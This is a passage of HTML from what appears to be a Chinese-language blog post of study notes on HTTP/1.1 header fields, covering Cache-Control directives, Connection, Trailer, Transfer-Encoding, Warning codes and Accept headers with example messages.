class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>若 <strong>HTTP</strong> 首部字段重复了会如何</p>\n<p> 不同浏览器解析方式不同，有的是解析前面，有的则是解析后面的</p>\n<h4 id=\"4-种-HTTP-首部字段类型\"><a href=\"#4-种-HTTP-首部字段类型\" class=\"headerlink\" title=\"4 种 HTTP 首部字段类型\"></a><strong>4</strong> 种 <strong>HTTP</strong> 首部字段类型</h4><ol>\n<li>通用首部字段（<strong>General</strong> <strong>Header Fields</strong>）</li>\n</ol>\n<p>请求报文和响应报文两方都会使用的首部。</p>\n<ol start=\"2\">\n<li>请求首部字段（<strong>Request Header Fields</strong>）</li>\n</ol>\n<p>从客户端向服务器端发送请求报文时使用的首部。补充了请求的附加内容、客户端信息、响应内容相关优先级等信息。</p>\n<ol start=\"3\">\n<li>响应首部字段（<strong>Response Header Fields</strong>）</li>\n</ol>\n<p>从服务器端向客户端返回响应报文时使用的首部。补充了响应的附加内容，也会要求客户端附加额外的内容信息。</p>\n<ol start=\"4\">\n<li>实体首部字段（<strong>Entity Header Fields</strong>）</li>\n</ol>\n<p>针对请求报文和响应报文的实体部分使用的首部。补充了资源内容更新时间等与实体有关的信息</p>\n<h4 id=\"HTTP-1-1-首部字段一览\"><a href=\"#HTTP-1-1-首部字段一览\" class=\"headerlink\" title=\"HTTP/1.1 首部字段一览\"></a>HTTP/1.1 首部字段一览</h4><p>RFC2616 中定义的 47 种首部字段</p>\n<h5 id=\"通用首部字段\"><a href=\"#通用首部字段\" class=\"headerlink\" title=\"通用首部字段\"></a>通用首部字段</h5><table>\n<thead>\n<tr>\n<th align=\"left\">首部字段名</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">Cache-Control</td>\n<td>控制缓存的行为</td>\n</tr>\n<tr>\n<td align=\"left\">Connection</td>\n<td>逐跳首部、连接的管理</td>\n</tr>\n<tr>\n<td align=\"left\">Date</td>\n<td>创建报文的日期时间</td>\n</tr>\n<tr>\n<td align=\"left\">Pragma</td>\n<td>报文指令</td>\n</tr>\n<tr>\n<td align=\"left\">Trailer</td>\n<td>报文末端的首部一览</td>\n</tr>\n<tr>\n<td align=\"left\">Transfer-Encoding</td>\n<td>指定报文主体的传输编码方式</td>\n</tr>\n<tr>\n<td align=\"left\">Upgrade</td>\n<td>升级为其他协议</td>\n</tr>\n<tr>\n<td align=\"left\">Via</td>\n<td>代理服务器的相关信息</td>\n</tr>\n<tr>\n<td align=\"left\">Warning</td>\n<td>错误通知</td>\n</tr>\n</tbody></table>\n<h5 id=\"请求首部字段\"><a href=\"#请求首部字段\" class=\"headerlink\" title=\"请求首部字段\"></a>请求首部字段</h5><table>\n<thead>\n<tr>\n<th>首部字段名</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Accept</td>\n<td>用户代理可处理的媒体类型</td>\n</tr>\n<tr>\n<td>Accept-Charset</td>\n<td>优先的字符集</td>\n</tr>\n<tr>\n<td>Accept-Encoding</td>\n<td>优先的内容编码</td>\n</tr>\n<tr>\n<td>Accept-Language</td>\n<td>优先的语言（自然语言）</td>\n</tr>\n<tr>\n<td>Authorization</td>\n<td>Web认证信息</td>\n</tr>\n<tr>\n<td>Expect</td>\n<td>期待服务器的特定行为</td>\n</tr>\n<tr>\n<td>From</td>\n<td>用户的电子邮箱地址</td>\n</tr>\n<tr>\n<td>Host</td>\n<td>请求资源所在服务器</td>\n</tr>\n<tr>\n<td>If-Match</td>\n<td>比较实体标记（ETag）</td>\n</tr>\n<tr>\n<td>If-Modified-Since</td>\n<td>比较资源的更新时间</td>\n</tr>\n<tr>\n<td>If-None-Match</td>\n<td>比较实体标记（与 If-Match 相反）</td>\n</tr>\n<tr>\n<td>If-Range</td>\n<td>资源未更新时发送实体 Byte 的范围请求</td>\n</tr>\n<tr>\n<td>If-Unmodified-Since</td>\n<td>比较资源的更新时间（与If-Modified-Since相反）</td>\n</tr>\n<tr>\n<td>Max-Forwards</td>\n<td>最大传输逐跳数</td>\n</tr>\n<tr>\n<td>Proxy-Authorization</td>\n<td>代理服务器要求客户端的认证信息</td>\n</tr>\n<tr>\n<td>Range</td>\n<td>实体的字节范围请求</td>\n</tr>\n<tr>\n<td>Referer</td>\n<td>对请求中 URI 的原始获取方</td>\n</tr>\n<tr>\n<td>TE</td>\n<td>传输编码的优先级</td>\n</tr>\n<tr>\n<td>User-Agent</td>\n<td>HTTP  客户端程序的信息</td>\n</tr>\n</tbody></table>\n<h5 id=\"响应首部字段\"><a href=\"#响应首部字段\" class=\"headerlink\" title=\"响应首部字段\"></a>响应首部字段</h5><table>\n<thead>\n<tr>\n<th>首部字段名</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Accept-Ranges</td>\n<td>是否接受字节范围请求</td>\n</tr>\n<tr>\n<td>Age</td>\n<td>推算资源创建经过时间</td>\n</tr>\n<tr>\n<td>ETag</td>\n<td>资源的匹配信息</td>\n</tr>\n<tr>\n<td>Location</td>\n<td>令客户端重定向至指定URI</td>\n</tr>\n<tr>\n<td>Proxy-Authenticate</td>\n<td>代理服务器对客户端的认证信息</td>\n</tr>\n<tr>\n<td>Retry-After</td>\n<td>对再次发起请求的时机要求</td>\n</tr>\n<tr>\n<td>Server</td>\n<td>HTTP服务器的安装信息</td>\n</tr>\n<tr>\n<td>Vary</td>\n<td>代理服务器缓存的管理信息</td>\n</tr>\n<tr>\n<td>WWW-Authenticate</td>\n<td>服务器对客户端的认证信息</td>\n</tr>\n</tbody></table>\n<h5 id=\"实体首部字段\"><a href=\"#实体首部字段\" class=\"headerlink\" title=\"实体首部字段\"></a>实体首部字段</h5><table>\n<thead>\n<tr>\n<th>首部字段名</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Allow</td>\n<td>资源可支持的HTTP方法</td>\n</tr>\n<tr>\n<td>Content-Encoding</td>\n<td>实体主体适用的编码方式</td>\n</tr>\n<tr>\n<td>Content-Language</td>\n<td>实体主体的自然语言</td>\n</tr>\n<tr>\n<td>Content-Length</td>\n<td>实体主体的大小（单位：字节）</td>\n</tr>\n<tr>\n<td>Content-Location</td>\n<td>替代对应资源的URI</td>\n</tr>\n<tr>\n<td>Content-MD5</td>\n<td>实体主体的报文摘要</td>\n</tr>\n<tr>\n<td>Content-Range</td>\n<td>实体主体的位置范围</td>\n</tr>\n<tr>\n<td>Content-Type</td>\n<td>实体主体的媒体类型</td>\n</tr>\n<tr>\n<td>Expires</td>\n<td>实体主体过期的日期时间</td>\n</tr>\n<tr>\n<td>Last-Modified</td>\n<td>资源的最后修改日期时间</td>\n</tr>\n</tbody></table>\n<h4 id=\"非-HTTP-1-1-首部字段\"><a href=\"#非-HTTP-1-1-首部字段\" class=\"headerlink\" title=\"非 HTTP/1.1 首部字段\"></a>非 <strong>HTTP/1.1</strong> 首部字段</h4><p>RFC4229</p>\n<p>Cookie、Set-Cookie 和 Content-Disposition 等</p>\n<h4 id=\"End-to-end-首部和-Hop-by-hop-首部\"><a href=\"#End-to-end-首部和-Hop-by-hop-首部\" class=\"headerlink\" title=\"End-to-end 首部和 Hop-by-hop 首部\"></a><strong>End-to-end</strong> 首部和 <strong>Hop-by-hop</strong> 首部</h4><h5 id=\"端到端首部（End-to-end-Header）\"><a href=\"#端到端首部（End-to-end-Header）\" class=\"headerlink\" title=\"端到端首部（End-to-end Header）\"></a>端到端首部（<strong>End-to-end Header</strong>）</h5><p>分在此类别中的首部会转发给请求 / 响应对应的最终接收目标，且必须保存在由缓存生成的响应中，另外规定它必须被转发。</p>\n<h5 id=\"逐跳首部（Hop-by-hop-Header）\"><a href=\"#逐跳首部（Hop-by-hop-Header）\" class=\"headerlink\" title=\"逐跳首部（Hop-by-hop Header）\"></a>逐跳首部（<strong>Hop-by-hop Header</strong>）</h5><p>分在此类别中的首部只对单次转发有效，会因通过缓存或代理而不再转发。HTTP/1.1 和之后版本中，如果要使用 hop-by-hop 首部，需提供 Connection 首部字段。</p>\n<p>除了一下8种其他全是端到端首部</p>\n<table>\n<thead>\n<tr>\n<th>Connection</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Keep-Alive</td>\n</tr>\n<tr>\n<td><strong>Proxy-Authenticate</strong></td>\n</tr>\n<tr>\n<td><strong>Proxy-Authorization</strong></td>\n</tr>\n<tr>\n<td><strong>Trailer</strong></td>\n</tr>\n<tr>\n<td>TE</td>\n</tr>\n<tr>\n<td><strong>Transfer-Encoding</strong></td>\n</tr>\n<tr>\n<td><strong>Upgrade</strong></td>\n</tr>\n</tbody></table>\n<h3 id=\"HTTP-1-1-通用首部字段\"><a href=\"#HTTP-1-1-通用首部字段\" class=\"headerlink\" title=\"HTTP/1.1 通用首部字段\"></a><strong>HTTP/1.1</strong> 通用首部字段</h3><p>通用首部字段是指，请求报文和响应报文双方都会使用的首部。</p>\n<h4 id=\"Cache-Control\"><a href=\"#Cache-Control\" class=\"headerlink\" title=\"Cache-Control\"></a><strong>Cache-Control</strong></h4><p>首部字段 <strong>Cache-Control</strong> 能够控制缓存的行为</p>\n<p>写法<code>Cache-Control: private, max-age=0, no-cache</code></p>\n<h5 id=\"缓存请求指令\"><a href=\"#缓存请求指令\" class=\"headerlink\" title=\"缓存请求指令\"></a>缓存请求指令</h5><table>\n<thead>\n<tr>\n<th>指令</th>\n<th>参数</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>no-cache</td>\n<td>无</td>\n<td>强制向源服务器再次验证</td>\n</tr>\n<tr>\n<td>no-store</td>\n<td>无</td>\n<td>不缓存请求或响应的任何内容</td>\n</tr>\n<tr>\n<td>max-age  = [ 秒]</td>\n<td>必需</td>\n<td>响应的最大Age值</td>\n</tr>\n<tr>\n<td>max-stale( = [ 秒])</td>\n<td>可省略</td>\n<td>接收已过期的响应</td>\n</tr>\n<tr>\n<td>min-fresh  = [ 秒]</td>\n<td>必需</td>\n<td>期望在指定时间内的响应仍有效</td>\n</tr>\n<tr>\n<td>no-transform</td>\n<td>无</td>\n<td>代理不可更改媒体类型</td>\n</tr>\n<tr>\n<td>only-if-cached</td>\n<td>无</td>\n<td>从缓存获取资源</td>\n</tr>\n<tr>\n<td>cache-extension</td>\n<td>-</td>\n<td>新指令标记（token）</td>\n</tr>\n</tbody></table>\n<h5 id=\"缓存响应指令\"><a href=\"#缓存响应指令\" class=\"headerlink\" title=\"缓存响应指令\"></a>缓存响应指令</h5><table>\n<thead>\n<tr>\n<th>指令</th>\n<th>参数</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>public</td>\n<td>无</td>\n<td>可向任意方提供响应的缓存</td>\n</tr>\n<tr>\n<td>private</td>\n<td>可省略</td>\n<td>仅向特定用户返回响应</td>\n</tr>\n<tr>\n<td>no-cache</td>\n<td>可省略</td>\n<td>缓存前必须先确认其有效性</td>\n</tr>\n<tr>\n<td>no-store</td>\n<td>无</td>\n<td>不缓存请求或响应的任何内容</td>\n</tr>\n<tr>\n<td>no-transform</td>\n<td>无</td>\n<td>代理不可更改媒体类型</td>\n</tr>\n<tr>\n<td>must-revalidate</td>\n<td>无</td>\n<td>可缓存但必须再向源服务器进行确认</td>\n</tr>\n<tr>\n<td>proxy-revalidate</td>\n<td>无</td>\n<td>要求中间缓存服务器对缓存的响应有效性再进行确认</td>\n</tr>\n<tr>\n<td>max-age = [ 秒]</td>\n<td>必需</td>\n<td>响应的最大Age值</td>\n</tr>\n<tr>\n<td>s-maxage  = [ 秒]</td>\n<td>必需</td>\n<td>公共缓存服务器响应的最大Age值</td>\n</tr>\n<tr>\n<td>cache-extension</td>\n<td>-</td>\n<td>新指令标记（token）</td>\n</tr>\n</tbody></table>\n<h5 id=\"表示是否能缓存的指令\"><a href=\"#表示是否能缓存的指令\" class=\"headerlink\" title=\"表示是否能缓存的指令\"></a>表示是否能缓存的指令</h5><ul>\n<li><p><code>Cache-Control: public</code></p>\n<p>当指定使用 public 指令时，则明确表明其他用户也可利用缓存。</p>\n</li>\n<li><p><code>Cache-Control: private</code></p>\n<p>当指定 private 指令后，响应只以特定的用户作为对象，这与 public指令的行为相反。</p>\n<p>缓存服务器会对该特定用户提供资源缓存的服务，对于其他用户发送过来的请求，代理服务器则不会返回缓存。</p>\n</li>\n<li><p><code>Cache-Control: no-cache</code></p>\n<p>使用 no-cache 指令的目的是为了防止从缓存中返回过期的资源。 </p>\n<p>客户端发送的请求中如果包含 no-cache 指令，则表示客户端将不会接收缓存过的响应。于是，“中间”的缓存服务器必须把客户端请求转发给源服务器。中间缓存服务器不缓存，相当于隧道不对报文做文章。</p>\n</li>\n</ul>\n<ul>\n<li><p><code>Cache-Control: no-cache=Location</code></p>\n<p>由服务器返回的响应中，若报文首部字段 Cache-Control 中对 no-cache 字段名具体指定参数值，那么客户端在接收到这个被指定参数值的首部字段对应的响应报文后，就不能使用缓存。换言之，无参数值的首部字段可以使用缓存。只能在响应指令中指定该参数。</p>\n</li>\n</ul>\n<h5 id=\"控制可执行缓存的对象的指令\"><a href=\"#控制可执行缓存的对象的指令\" class=\"headerlink\" title=\"控制可执行缓存的对象的指令\"></a>控制可执行缓存的对象的指令</h5><ul>\n<li><p><code>Cache-Control: no-store</code></p>\n<p>当使用 no-store 指令时，暗示请求（和对应的响应）或响应中包含机密信息。</p>\n<p>该指令规定缓存不能在本地存储请求或响应的任一部分。</p>\n</li>\n</ul>\n<h5 id=\"指定缓存期限和认证的指令\"><a href=\"#指定缓存期限和认证的指令\" class=\"headerlink\" title=\"指定缓存期限和认证的指令\"></a>指定缓存期限和认证的指令</h5><ul>\n<li><p><code>Cache-Control: s-maxage=604800（单位 ：秒）</code></p>\n<p>s-maxage 指令的功能和 max-age 指令的相同，它们的不同点是 s- maxage 指令只适用于供多位用户使用的公共缓存服务器 。也就是说，对于向同一用户重复返回响应的服务器来说，这个指令没有任何作用。</p>\n<p>当使用 s-maxage 指令后，则直接忽略对 Expires 首部字段及max-age 指令的处理。</p>\n</li>\n<li><p><code>Cache-Control: max-age=604800（单位：秒）</code></p>\n<p>当客户端发送的请求中包含 max-age 指令时，如果判定缓存资源的缓存时间数值比指定时间的数值更小，那么客户端就接收缓存的资源。另外，当指定 max-age 值为 0，那么缓存服务器通常需要将请求转发给源服务器。</p>\n<p>当服务器返回的响应中包含 max-age 指令时，缓存服务器将不对资源的有效性再作确认，而 max-age 数值代表资源保存为缓存的最长时间。</p>\n<p>应用 HTTP/1.1 版本的缓存服务器遇到同时存在 Expires 首部字段的情况时，会优先处理 max-age 指令，而忽略掉 Expires 首部字段。而HTTP/1.0 版本的缓存服务器的情况却相反，max-age 指令会被忽略掉。</p>\n</li>\n<li><p><code>Cache-Control: min-fresh=60（单位：秒）</code></p>\n<p>min-fresh 指令要求缓存服务器返回至少还未过指定时间的缓存资源。</p>\n</li>\n<li><p><code>Cache-Control: max-stale=3600（单位：秒）</code></p>\n<p>使用 max-stale 可指示缓存资源，即使过期也照常接收。</p>\n<p>如果指令未指定参数值，那么无论经过多久，客户端都会接收响应； 如果指令中指定了具体数值，那么即使过期，只要仍处于 max-stale 指定的时间内，仍旧会被客户端接收。</p>\n</li>\n<li><p><code>Cache-Control: only-if-cached</code></p>\n<p>使用 only-if-cached 指令表示客户端仅在缓存服务器本地缓存目标资源的情况下才会要求其返回。换言之，该指令要求缓存服务器不重新加载响应，也不会再次确认资源有效性。若发生请求缓存服务器的本地缓存无响应，则返回状态码 504 Gateway Timeout。</p>\n</li>\n<li><p><code>Cache-Control: must-revalidate</code></p>\n<p>使用 must-revalidate 指令，代理会向源服务器再次验证即将返回的响应缓存目前是否仍然有效。</p>\n<p>若代理无法连通源服务器再次获取有效资源的话，缓存必须给客户端一条 504（Gateway Timeout）状态码。</p>\n<p>另外，使用 must-revalidate 指令会忽略请求的 max-stale 指令（即使已经在首部使用了 max-stale，也不会再有效果）。</p>\n</li>\n<li><p><code>Cache-Control: proxy-revalidate</code></p>\n<p>proxy-revalidate 指令要求所有的缓存服务器在接收到客户端带有该指令的请求返回响应之前，必须再次验证缓存的有效性。</p>\n</li>\n<li><p><code>Cache-Control: no-transform</code></p>\n<p>使用 no-transform 指令规定无论是在请求还是响应中，缓存都不能改变实体主体的媒体类型。</p>\n<p>这样做可防止缓存或代理压缩图片等类似操作。</p>\n</li>\n</ul>\n<h5 id=\"Cache-Control-扩展\"><a href=\"#Cache-Control-扩展\" class=\"headerlink\" title=\"Cache-Control 扩展\"></a>Cache-Control 扩展</h5><p><code>Cache-Control: private, community=\"UCI\"</code></p>\n<p>通过 cache-extension 标记（token），可以扩展 Cache-Control 首部字段内的指令。</p>\n<p>如上例，Cache-Control 首部字段本身没有 community 这个指令。借助extension tokens 实现了该指令的添加。如果缓存服务器不能理解community 这个新指令，就会直接忽略。因此，extension tokens 仅对能理解它的缓存服务器来说是有意义的。</p>\n<h4 id=\"Connection\"><a href=\"#Connection\" class=\"headerlink\" title=\"Connection\"></a>Connection</h4><h5 id=\"作用\"><a href=\"#作用\" class=\"headerlink\" title=\"作用\"></a>作用</h5><ul>\n<li><p>控制不再转发给代理的首部字段<code>Connection: 不再转发的首部字段名</code></p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/f6aa486e881b027e5f4c0eae92b1bf92.png\"></p>\n</li>\n<li><p>管理持久连接</p>\n<p>HTTP/1.1 之前的 HTTP 版本的默认连接都是非持久连接。为此，如果想在旧版本的 HTTP 协议上维持持续连接，则需要指定Connection 首部字段的值为 Keep-Alive。<code>Connection: Keep-Alive</code></p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/fa4c471298769a15944259a15361652e.png\"></p>\n<p>HTTP/1.1 版本的默认连接都是持久连接。为此，客户端会在持久连接上连续发送请求。当服务器端想明确断开连接时，则指定Connection 首部字段的值为 Close。<code>Connection: close</code></p>\n</li>\n</ul>\n<h4 id=\"Date\"><a href=\"#Date\" class=\"headerlink\" title=\"Date\"></a>Date</h4><p>首部字段 Date 表明创建 HTTP 报文的日期和时间。</p>\n<ul>\n<li><p>HTTP/1.1 协议使用在 RFC1123 中规定的日期时间的格式</p>\n<p><code>Date: Tue, 03 Jul 2012 04:40:59 GMT</code></p>\n</li>\n<li><p>之前的 HTTP 协议版本中使用在 RFC850 中定义的格式</p>\n<p><code>Date: Tue, 03-Jul-12 04:40:59 GMT</code></p>\n</li>\n<li><p>C 标准库内的 asctime() 函数的输出格式</p>\n<p><code>Date: Tue Jul 03 04:40:59 2012</code></p>\n</li>\n</ul>\n<h4 id=\"Pragma\"><a href=\"#Pragma\" class=\"headerlink\" title=\"Pragma\"></a>Pragma</h4><p>Pragma 是 HTTP/1.1 之前版本的历史遗留字段，仅作为与 HTTP/1.0的向后兼容而定义。相当于HTTP/1.1之后Cache-Control</p>\n<p><code>Pragma: no-cache</code></p>\n<pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">Cache-Control</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">no-cache </span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Pragma</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">no-cache</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>通常一起用，因为你不能掌握全部中间服务器</p>\n<h4 id=\"Trailer\"><a href=\"#Trailer\" class=\"headerlink\" title=\"Trailer\"></a>Trailer</h4><p>首部字段 Trailer 会事先说明在报文主体后记录了哪些首部字段。该首部字段可应用在 HTTP/1.1 版本分块传输编码时。</p>\n<pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token response-status\"><span class=\"token http-version property\">HTTP/1.1</span> <span class=\"token status-code number\">200</span> <span class=\"token reason-phrase string\">OK</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Date</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Tue, 03 Jul 2012 04:40:56 GMT</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">text/html</span></span>\n<span class=\"token text-html\">...\nTransfer-Encoding: chunked\nTrailer: Expires\n\n...(报文主体)... 0\nExpires: Tue, 28 Sep 2004 23:59:59 GMT</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>以上用例中，指定首部字段 Trailer 的值为 Expires，在报文主体之后（分块长度 0 之后）出现了首部字段 Expires。</p>\n<h4 id=\"Transfer-Encoding\"><a href=\"#Transfer-Encoding\" class=\"headerlink\" title=\"Transfer-Encoding\"></a>Transfer-Encoding</h4><p>首部字段 Transfer-Encoding 规定了传输报文主体时采用的编码方式。</p>\n<p>HTTP/1.1 的传输编码方式仅对分块传输编码有效。</p>\n<pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token response-status\"><span class=\"token http-version property\">HTTP/1.1</span> <span class=\"token status-code number\">200</span> <span class=\"token reason-phrase string\">OK</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Date</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Tue, 03 Jul 2012 04:40:56 GMT</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Cache-Control</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">public, max-age=604800 </span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">text/javascript; charset=utf-8 </span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Expires</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Tue, 10 Jul 2012 04:40:56 GMT</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">X-Frame-Options</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">DENY</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">X-XSS-Protection</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">1; mode=block </span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Encoding</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">gzip </span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Transfer-Encoding</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">chunked </span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Connection</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">keep-alive</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"Upgrade\"><a href=\"#Upgrade\" class=\"headerlink\" title=\"Upgrade\"></a>Upgrade</h4><p>首部字段 Upgrade 用于检测 HTTP 协议及其他协议是否可使用更高的版本进行通信，其参数值可以用来指定一个完全不同的通信协议。</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/c345255e4e1f7c71755193f3e9157b21.png\"></p>\n<p>上图用例中，首部字段 Upgrade 指定的值为 TLS/1.0。请注意此处两个字段首部字段的对应关系，Connection 的值被指定为 Upgrade。Upgrade 首部字段产生作用的 Upgrade 对象仅限于客户端和邻接服务器之间。因此，使用首部字段 Upgrade 时，还需要额外指定Connection:Upgrade。</p>\n<p>对于附有首部字段 Upgrade 的请求，服务器可用 101 Switching Protocols 状态码作为响应返回。</p>\n<h4 id=\"Via\"><a href=\"#Via\" class=\"headerlink\" title=\"Via\"></a>Via</h4><p>使用首部字段 Via 是为了追踪客户端与服务器之间的请求和响应报文的传输路径。</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/eb53ad7d905d8029eca3b989b9348508.png\"></p>\n<p>首部字段 Via 不仅用于追踪报文的转发，还可避免请求回环的发生。所以必须在经过代理时附加该首部字段内容。</p>\n<p>1.0是指代理服务器的HTTP版本</p>\n<h4 id=\"Warning\"><a href=\"#Warning\" class=\"headerlink\" title=\"Warning\"></a>Warning</h4><p>HTTP/1.1 的 Warning 首部是从 HTTP/1.0 的响应首部（Retry-After）演变过来的。该首部通常会告知用户一些与缓存相关的问题的警告。</p>\n<pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">Warning</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">[警告码][警告的主机:端口号]“[警告内容]”([日期时间])</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Warning</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">113 gw.hackr.jp:8080 \"Heuristic expiration\" Tue, 03</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h5 id=\"HTTP-1-1-警告码\"><a href=\"#HTTP-1-1-警告码\" class=\"headerlink\" title=\"HTTP/1.1 警告码\"></a><strong>HTTP/1.1</strong> 警告码</h5><table>\n<thead>\n<tr>\n<th>警告码</th>\n<th>警告内容</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>110</td>\n<td>Response  is stale（响应已过期）</td>\n<td>代理返回已过期的资源</td>\n</tr>\n<tr>\n<td>111</td>\n<td>Revalidation  failed（再验证失败）</td>\n<td>代理再验证资源有效性时失败（服务器无法到达等原因）</td>\n</tr>\n<tr>\n<td>112</td>\n<td>Disconnection operation（断开连接操作）</td>\n<td>代理与互联网连接被故意切断</td>\n</tr>\n<tr>\n<td>113</td>\n<td>Heuristic  expiration（试探性过期）</td>\n<td>响应的使用期超过24小时（有效缓存的设定时间大于24小时的情况下）</td>\n</tr>\n<tr>\n<td>199</td>\n<td>Miscellaneous  warning（杂项警告）</td>\n<td>任意的警告内容</td>\n</tr>\n<tr>\n<td>214</td>\n<td>Transformation  applied（使用了转换）</td>\n<td>代理对内容编码或媒体类型等执行了某些处理时</td>\n</tr>\n<tr>\n<td>299</td>\n<td>Miscellaneous persistent  warning（持久杂项警告）</td>\n<td>任意的警告内容</td>\n</tr>\n</tbody></table>\n<h3 id=\"请求首部字段-1\"><a href=\"#请求首部字段-1\" class=\"headerlink\" title=\"请求首部字段\"></a>请求首部字段</h3><p>请求首部字段是从客户端往服务器端发送请求报文中所使用的字段， 用于补充请求的附加信息、客户端信息、对响应内容相关的优先级等内容。</p>\n<h4 id=\"Accept\"><a href=\"#Accept\" class=\"headerlink\" title=\"Accept\"></a>Accept</h4><p><img src=\"https://images.dadream.eu.org/images/2024/07/28a3ddf597307b46dbfd4f5fcaa59bc6.png\"></p>\n<pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">Accept</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">text/html,application/xhtml+xml,application/xml;q=0.1</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<ul>\n<li><p>文本文件</p>\n<p>text/html, text/plain, text/css … </p>\n<p>application/xhtml+xml, application/xml …</p>\n</li>\n<li><p>图片文件</p>\n<p>image/jpeg, image/gif, image/png …</p>\n</li>\n<li><p>视频文件</p>\n<p>video/mpeg, video/quicktime …</p>\n</li>\n<li><p>应用程序使用的二进制文件</p>\n<p>application/octet-stream, application/zip …</p>\n</li>\n</ul>\n<p>比如，如果浏览器不支持 PNG 图片的显示，那 Accept 就不指定image/png，而指定可处理的 image/gif 和 image/jpeg 等图片类型。</p>\n<p>若想要给显示的媒体类型增加优先级，则使用 q= 来额外表示权重值1，用分（;）进行分隔。权重值 q 的范围是 0~1（可精确到小数点后 3 位），且 1 为最大值。不指定权重 q 值时，默认权重为 q=1.0。</p>\n<h4 id=\"Accept-Charset\"><a href=\"#Accept-Charset\" class=\"headerlink\" title=\"Accept-Charset\"></a>Accept-Charset</h4><p><img src=\"https://images.dadream.eu.org/images/2024/07/c4e11a52cebd529f557a2167802d9ffc.png\"></p>\n<pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">Accept-Charset</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">iso-8859-5, unicode-1-1;q=0.8</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h4 id=\"Accept-Encoding\"><a href=\"#Accept-Encoding\" class=\"headerlink\" title=\"Accept-Encoding\"></a>Accept-Encoding</h4><pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">Accept-Encoding</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">gzip, deflate</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>Accept-Encoding 首部字段用来告知服务器用户代理支持的内容编码及内容编码的优先级顺序。可一次性指定多种内容编码。</p>\n<ul>\n<li>gzip</li>\n<li>compress</li>\n<li>deflate</li>\n<li>identity</li>\n</ul>\n<p>也能使用权重q，使用<code>*</code>作为通配符</p>\n<h4 id=\"Accept-Language\"><a href=\"#Accept-Language\" class=\"headerlink\" title=\"Accept-Language\"></a>Accept-Language</h4><pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">Accept-Language</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">zh-cn,zh;q=0.7,en-us,en;q=0.3</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>首部字段 Accept-Language 用来告知服务器用户代理能够处理的自然语言集（指中文或英文等），以及自然语言集的相对优先级。可一次指定多种自然语言集。</p>\n<h4 id=\"Authorization\"><a href=\"#Authorization\" class=\"headerlink\" 